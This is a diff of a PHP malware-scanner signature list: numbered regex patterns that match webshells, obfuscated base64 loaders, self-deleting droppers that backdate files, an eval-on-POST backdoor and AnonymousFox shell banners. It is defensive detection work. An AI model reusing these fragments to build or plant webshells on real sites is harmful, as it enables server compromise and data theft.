+      'pattern' => '/^\\s*\\<\\?php \\$yhhhrszgqz\\=str_ireplace\\("y","","ybyyyyayysyyyyeyyy6yyy4yyyyy_yyyyyydyyyyeyyyyycyyyoyydyyyyey"\\); \\$xkwdwx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    502 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$marczypp\\=str_ireplace\\("u","","uubuuuauuuusuuuueuu6uuuu4uuuu_uuuduuuueuuuucuuuuouuuuduuueu"\\); \\$gazmdgrcf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    503 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "kudZYyaRKB"; if \\(file_exists\\("\\.\\/preview\\.php"\\)\\)\\{ touch\\("\\.\\/preview\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4ecDGXpfqKN/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    504 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$unfstzz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$machr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    505 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gqcqgtr\\=str_ireplace\\("y","","yyybyyyayyyysyyyyeyyyy6yyyy4yyyy_yydyyyyyyeyyycyyyyoyyyydyyeyy"\\); \\$caaxq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    506 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xnaynvs\\=str_ireplace\\("f","","ffbfffaffsfffffefff6ffffff4ffff_fffdffffefffffcfffofffffdfffefff"\\); \\$rcbacsmyc\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    507 => 
+    array (
+      'pattern' => '/WVVd5ZHJaWGtuWFNsN0RRcGxZMmh2SUNjOFptOXliU0J1WVc[\\s\\S]{0,12000}DUVXTM\'\\)\\)
+\\{
+	define\\(\'DUVXTM\', __DIR__\\);
+\\}
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    508 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$vwmbwqk\\=str_ireplace\\("n","","nnnbnnnnnannnnsnnnnennnn6nnn4nn_nnnndnnennnncnnnonnnnndnnnnenn"\\); \\$mkmmvcu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    509 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php phpinfo\\(\\); \\?\\>\\s*$/s',
+      'label' => 'exact source-file content',
+    ),
+    510 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}kxRU5DaTh2YzJWdVpBMEthV1lvWlcxd2RIa29KRzEwWW5Kel/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    511 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$yacheqy\\=str_ireplace\\("q","","qqqbqqqqqqaqqqqsqqqqqqeqqqq6qqqq4qqqqq_qqqdqqeqqqcqqqqoqqqqdqqqqqeqqq"\\); \\$cdevs\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    512 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$fwpdvehz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$ukryqd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbml/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    513 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "sbBfEZCYpy"; if \\(file_exists\\("\\.\\/tcntacc\\.php"\\)\\)\\{ touch\\("\\.\\/tcntacc\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Dx2v0n6S5wQ/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    514 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$rfacrppx\\=str_ireplace\\("n","","nbnnnnannnnnsnnennn6nnnn4nnnn_nnnndnnnnennnnncnnonnnndnnnnen"\\); \\$ewnmagu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    515 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "BbYtDFKCVC"; if \\(file_exists\\("\\.\\/user_login\\.php"\\)\\)\\{ touch\\("\\.\\/user_login\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*sUhkd/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    516 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$yntavbd\\=str_ireplace\\("x","","xbxxxxxaxxxsxxexxx6xxx4xxxxx_xxxdxxxxexxxxxcxxxoxxxxdxxxexxx"\\); \\$ttawhe\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    517 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$sdhgys\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$nstsgbvubx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    518 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "TkZGKxqFRR"; if \\(file_exists\\("\\.\\/page\\-36\\.php"\\)\\)\\{ touch\\("\\.\\/page\\-36\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*B8C8wnEU3fb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    519 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "BaVuuVECTe"; if \\(file_exists\\("\\.\\/deptodoc\\.php"\\)\\)\\{ touch\\("\\.\\/deptodoc\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*5uYE73dBu/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    520 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "GpcXAVbEtV"; if \\(file_exists\\("\\.\\/m5_checkout\\.php"\\)\\)\\{ touch\\("\\.\\/m5_checkout\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*3X4/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    521 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Stream\\.wbn\\.Libraries
+ \\*[\\s\\S]{0,12000}\'IS_UNIX\', \\(IS_WIN \\=\\=\\= false\\) \\? true \\: false\\);
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    522 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$yssdv\\=str_ireplace\\("p","","ppbppppappppsppppeppppp6ppppp4ppppp_ppppppdppppppeppppppcppppoppppdppppppep"\\); \\$cywrsusf\\="DQoJCUBlcnJvcl9y/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    523 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$atkrync\\=str_ireplace\\("f","","fbfffaffffffsfffefffff6ff4ffffff_ffffdfffeffffcffffoffdfffffeff"\\); \\$mechmu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    524 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$bzbfaxzrb\\=str_ireplace\\("r","","rbrrrrrarrrrrrsrrrrerrrr6rrrrr4rrrrrr_rrrrrrdrrrrerrrcrrrrorrrrrrdrrrrer"\\); \\$ygxnztamke\\="DQoJCUBlcnJvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    525 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$sztcs\\=str_ireplace\\("q","","qbqqqqqqaqqsqqqqqqeqqqqq6qqqqqq4qqq_qqqdqqqqeqqcqqqqoqqqqdqqqqeq"\\); \\$twpdsmhbyh\\="DQoJCUBlcnJvcl9yZXBvcnRpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    526 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$rnafu\\=str_ireplace\\("k","","kkkbkkkkakkkkkskkkkekkkkkk6kkkkk4kk_kkkkdkkkekkkkkckkkkokkkkkkdkkkkekkk"\\); \\$gyyxpsmzkg\\="DQoJCUBlcnJvcl9yZX/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    527 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$yufcysp\\=str_ireplace\\("m","","mmmbmmammmmsmmemmm6mmmmmm4mmmm_mmmmdmmmmmmemmmmmcmmmommmmdmmmmmmem"\\); \\$enpqahene\\="DQoJCUBlcnJvcl9yZXBvcn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    528 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xfrckhes\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$mybdag\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbml/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    529 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$uwwckvnecz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$qbqdnatetn\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    530 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$uwqbxpy\\=str_ireplace\\("z","","zzzbzzzazzzzzzszzzzzezzzzzz6zzzzz4zzzz_zzzzdzzzezzzczzzzozzzdzzzzzezz"\\); \\$apsgyfpa\\="DQoJCUBlcnJvcl9yZXBv/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    531 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$cymvpxt\\=str_ireplace\\("g","","gggbggggaggggsgggggeggggg6gggg4gg_gggggdggggeggggggcggggogggdggeg"\\); \\$ktwwpchwe\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    532 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ntawv\\=str_ireplace\\("u","","uuubuuuauuusuueuuuuu6uuuu4uuu_uuuuuduueuucuuuuouuuuuduuuuueu"\\); \\$wyebagtu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    533 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "tAsBqFFsRG"; if \\(file_exists\\("\\.\\/publicidad\\.php"\\)\\)\\{ touch\\("\\.\\/publicidad\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*cF6vM/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    534 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "QrPhvSDwkP"; if \\(file_exists\\("\\.\\/config\\.sum\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.sum\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*h8AbE/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    535 => 
+    array (
+      'pattern' => '/VBqd3ZkR1ErRFFvOEwzUnlQangwY2o0OGRHUStVbVZ6WlhKM[\\s\\S]{0,12000}CAU\'\\)\\)
+\\{
+	define\\(\'BNQCAU\', __DIR__\\);
+\\}
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    536 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "VgHgHbtMcK"; if \\(file_exists\\("\\.\\/pv_de_recette\\.php"\\)\\)\\{ touch\\("\\.\\/pv_de_recette\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\//s',
+      'label' => 'source-file first-line anchor',
+    ),
+    537 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$fqkzgtt\\=str_ireplace\\("k","","kkkbkkakkkkkskkekk6kkkkk4kk_kkkkkdkkekkkkkckkkkkokkkdkkkkkekk"\\); \\$ryevfgueb\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    538 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$nmrwdtvncu\\=str_ireplace\\("u","","uubuuuauuuusuuuueuu6uuuu4uuuu_uuuduuuueuuuucuuuuouuuuduuueu"\\); \\$wugfx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    539 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ecnsxuthgy\\=str_ireplace\\("p","","pbppppappsppeppppp6ppp4ppp_pppdpppppepppcpppppoppppdpppep"\\); \\$qhrvck\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    540 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$seufa\\=str_ireplace\\("f","","fffbffaffsffffefff6ffff4fff_ffffdffefffffcfffofffffdfffffef"\\); \\$smxptf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQ/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    541 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$esfnctr\\=str_ireplace\\("x","","xxbxxxaxxxxsxxxexxx6xxxxx4xxx_xxxxxdxxexxcxxxoxxxxxdxxxxxexx"\\); \\$kteyrsepb\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    542 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "QWznfDAaxU"; if \\(file_exists\\("\\.\\/cataloguesearch\\.php"\\)\\)\\{ touch\\("\\.\\/cataloguesearch\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    543 => 
+    array (
+      'pattern' => '/Fva2JXOWtaVDBrWDBkRlZGc2liVzlrWlNKZE93MEthV1lvSkcxdlpHVTlQU0pqYjI1bWFXY2lJRUZPUkNBa2JXZDVZM2xoUFQwa1gwZEZWRnNuYTJWNUoxMH/s',
+      'label' => 'sample-specific content window',
+    ),
+    544 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$bnqztzrrdy\\=str_ireplace\\("k","","kkkbkkkkakkkkkskkkkekkkkkk6kkkkk4kk_kkkkdkkkekkkkkckkkkokkkkkkdkkkkekkk"\\); \\$msupuh\\="DQoJCUBlcnJvcl9yZ/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    545 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mcunf\\=str_ireplace\\("g","","gggbgggggagggggsggggeggg6gg4gggg_ggggdgggegggggcgggggoggggdgggegg"\\); \\$tytcnrzsnv\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    546 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$vvbxwx\\=str_ireplace\\("w","","wwwbwwwwawwwswwwewwwwww6www4www_wwwwdwwwwwwewwwwwcwwwwowwwdwwwweww"\\); \\$udvsrefgbr\\="DQoJCUBlcnJvcl9yZXBvcn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    547 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "qaTTeUhRBQ"; if \\(file_exists\\("\\.\\/sendtomobile\\.php"\\)\\)\\{ touch\\("\\.\\/sendtomobile\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*c/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    548 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$zcrktm\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$kwvtra\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    549 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "gZkzTNaUDf"; if \\(file_exists\\("\\.\\/youve_lib\\.php"\\)\\)\\{ touch\\("\\.\\/youve_lib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*b16hcar/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    550 => 
+    array (
+      'pattern' => '/ZVY5bGNuSnZjbk1uTENCbVlXeHpaU2s3RFFwQWMyVjBYM1Jw[\\s\\S]{0,12000}\\(\'CTHH\'\\)\\)
+\\{
+	define\\(\'CTHH\', __DIR__\\);
+\\}
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    551 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$zqymm\\=str_ireplace\\("i","","ibiiiaiiiisiieiiiii6iiiiii4ii_iiidiiiieiiiiiiciiiiioiiiidiiiiiieiii"\\); \\$fndddfhsc\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    552 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$svrhd\\=str_ireplace\\("k","","kkkbkkakkkkkkskkkkekkkkk6kkkkkk4kkkkk_kkkkkdkkkkkkekkckkokkkkdkkkekk"\\); \\$vbpecmd\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    553 => 
+    array (
+      'pattern' => '/3hwYlhCc2IyUmxLQ0lpTENSbWFXeGxLU2s3RFFwbVkyeHZjM[\\s\\S]{0,12000}\\^ \\(E_DEPRECATED\\|E_USER_DEPRECATED\\)\\);
+\\}
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    554 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*
+\\* You should  have received     a cop/s',
+      'label' => 'sample-specific content window',
+    ),
+    555 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "SEUgbUeBmF"; if \\(file_exists\\("\\.\\/init\\.Saturday\\.php"\\)\\)\\{ touch\\("\\.\\/init\\.Saturday\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\//s',
+      'label' => 'source-file first-line anchor',
+    ),
+    556 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "EzWFhefkQU"; if \\(file_exists\\("\\.\\/credits\\.php"\\)\\)\\{ touch\\("\\.\\/credits\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*fdnadZFfM4Z/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    557 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "taPQSBBzBC"; if \\(file_exists\\("\\.\\/config\\.immediately\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.immediately\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    558 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$qrtwsx\\=str_ireplace\\("u","","ubuuuuauuuuusuuuuueuuu6uu4uuuuu_uuduuuueuuucuuuuouuuuduuuueuu"\\); \\$zbyknzx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    559 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$rybdsftgz\\=str_ireplace\\("y","","yyybyyyayyyysyyyyeyyyy6yyyy4yyyy_yydyyyyyyeyyycyyyyoyyyydyyeyy"\\); \\$kxmtdv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    560 => 
+    array (
+      'pattern' => '/rdUp5SStQQzkwWkQ0OGRHUStWRVJUSUVsUVBDOTBaRDROQ2p[\\s\\S]{0,12000}\\^ \\(E_DEPRECATED\\|E_USER_DEPRECATED\\)\\);
+\\}
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    561 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wcbbwngd\\=str_ireplace\\("g","","gggbgggggagggggsggggeggg6gg4gggg_ggggdgggegggggcgggggoggggdgggegg"\\); \\$gxcdfqc\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    562 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gznwg\\=str_ireplace\\("i","","ibiiiaiiiisiieiiiii6iiiiii4ii_iiidiiiieiiiiiiciiiiioiiiidiiiiiieiii"\\); \\$vrayhzgk\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    563 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "FrmaKXuSWk"; if \\(file_exists\\("\\.\\/statistic\\.php"\\)\\)\\{ touch\\("\\.\\/statistic\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*A23RGPe/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    564 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); if\\(file_exists\\("\\.user\\.ini"\\)\\)\\{ unlink\\("\\.user\\.ini"\\); \\} echo "FoxAutoV4 , Download \\=\\> anonymousfox\\.com\\\\n"; \\$code \\= \\$_/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    565 => 
+    array (
+      'pattern' => '/d federal laws\\. Developer assumes no liability a[\\s\\S]{0,12000}\\("H\\*", \\$v\\);
 \\}
 @eval\\(\\$_POST\\[\'pass\'\\]\\);
 \\?\\>
 postpass/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    566 => 
+    array (
+      'pattern' => '/PqwZvGaF1KUyJd3i9m3TSdmS1AGjFY1aqgE5BU26XbEwFRS1[\\s\\S]{0,12000}ptIrXeXwa2cFt6Pr\'\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    567 => 
+    array (
+      'pattern' => '/\\<\\?php
+error_reporting\\(0\\);
+set_time_limit\\(0\\);
+
+if[\\s\\S]{0,12000}Dir Done\\.\\<\\/font\\>\\<br \\/\\>\';
+            \\}else\\{/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    568 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* Toolbar API\\: Top\\-level Toolbar func[\\s\\S]{0,12000}\\+yNYVgzo0tBpC32%wP%mcjOesw0me6fL\\+56VM43yQ0mc326u/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    569 => 
+    array (
+      'pattern' => '/c\'\\.\'\'\\.\'\'\\.\'\'\\);
+		\\$d \\= \\$D\\("\\/\\*SjBxxhRQ9136\\*\\/", \\$sbtUuUuc5986\\( mp8Gs\\(\\$sbtUuUuc5986\\(\\$SGuBMYFP6885\\), "SbZiKTDo963"\\)\\)\\);
+		\\$d\\(\\);/s',
       'label' => 'sample-specific content window',
     ),
-    1213 => 
+    570 => 
     array (
-      'pattern' => '/\\= \'\';
-    for\\(\\$i\\=0;\\$i\\<\\=\\$id;\\$i\\+\\+\\)\\{
-        \\$linkpath \\.\\= "\\$paths\\[\\$i\\]";
-        if\\(\\$i \\!\\= \\$id\\) \\$linkpath \\.\\= "\\/";
-    \\}
-    e/s',
+      'pattern' => '/\\<\\?php
+function _v4XU\\(\\$_Lm9n9m\\)\\{\\$_Lm9n9m\\=substr\\(\\$[\\s\\S]{0,12000}Bm2CGXYXGrJlSNKm3K8\\+gHRAOd4\\+z6Ab3Lr3N36NGld7\\/Mgt/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    571 => 
+    array (
+      'pattern' => '/\\<\\?php 
+
+\\/\\*\\*
+ \\* applicant arise cancel chaos evolve extinct hardware infect necessity presumably rescue subt thrust ventu/s',
       'label' => 'sample-specific content window',
     ),
-    1214 => 
+    572 => 
     array (
-      'pattern' => '/\',\\$usedNameArr\\);
-			\\}
-			
-		\\}
-		
-		if\\(JDT \\=\\= 0\\)\\{
-			\\/\\/ \\$precat \\= strFilter\\(\\$precat\\);
-			\\/\\/ \\$precat \\= preg_replace\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    1215 => 
-    array (
-      'pattern' => '/\\(\\)\\.\'\\/\'\\.substr\\(\\$domain_name1,0,5\\)\\.chr\\(rand\\(97,122\\)\\)\\.\'\\.php\';
-		\\/\\/\\$shell5\\=BASE_PATH\\.\'\\/\'\\.substr\\(\\$domain_name1,0,5\\)\\.chr\\(rand\\(/s',
+      'pattern' => '/U256pL6ZHRzzR5ms0cg0ULjWUYAP8QHpdoFEgz6pvqxqFCxk5t39g1SVtGkJIy2rRmQ7ue7EC81bRj3wuJXZK3uv9OP0w2w\'\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\);
+\\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1216 => 
+    573 => 
     array (
-      'pattern' => '/\\$O\\{68\\}\\.\\$O\\{67\\}\\.\\$O\\{67\\}\\.\\$O\\{67\\}\\.\\$O\\{78\\}\\.\\$O\\{9\\}\\.\\$O\\{3\\}\\.\\$O\\{61\\}\\.\\$Ooooo\\.\\$O\\{78\\}\\.\\$O\\{6\\}\\.\\$O\\{3\\}\\.\\$O\\{18\\}\\.\\$O\\{61\\}\\.\\$Oo\\.\\$O\\{78\\}\\.\\$O\\{12\\}\\.\\$O\\{8\\}\\.\\$O/s',
-      'label' => 'sample-specific content window',
+      'pattern' => '/\\<\\?php
+	\\/\\/echo str_ireplace\\(\\$_SERVER\\[\'PHP_SELF\'\\],[\\s\\S]{0,12000}py success\\!\'\\.\'\\<br \\/\\>\'; 
+	    \\}
+	    else
+	    \\{/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1217 => 
+    574 => 
     array (
-      'pattern' => '/\\$oIndex \\= \'PGh0bWw\\+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJhci1rdyI\\+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZ[\\s\\S]{0,12000}echo "AnonymousFox \\.\\/Done \\/o\\.htm";/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/\\$O\\{8\\}\\.\\$O\\{23\\}\\.\\$O\\{8\\}\\.\\$O\\{4\\}\\.\\$O\\{11\\}\\];if\\(preg_match\\(\\$[\\s\\S]{0,12000}0\'\\);fwrite\\(\\$OoooO, \\$OooOOOOO\\);fclose\\(\\$OoooO\\);\\}\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1218 => 
+    575 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+\\$s2\\="aHR0cDovL3d3dy53d3d0ZWxlY29tc2Vydmlj[\\s\\S]{0,12000}curl_close\\(\\$ch\\);return \\$d;\\}\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    576 => 
+    array (
+      'pattern' => '/^\\s*\\<script type\\="text\\/javascript" defer\\>function VsX\\(\\)\\{ll\\=false;var Jlm\\=new Image\\(\\);Object\\.defineProperty\\(Jlm,\'id\',\\{get\\:function\\(\\)\\{ll\\=true;\\}\\}\\);/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    577 => 
+    array (
+      'pattern' => '/ZGRkYiPlR3aXR0ZXIgOiA8L2ZvbnQ\\+IAoJCQk8L2ZvbnQ\\+Cg[\\s\\S]{0,12000}Index\\)\\);
+
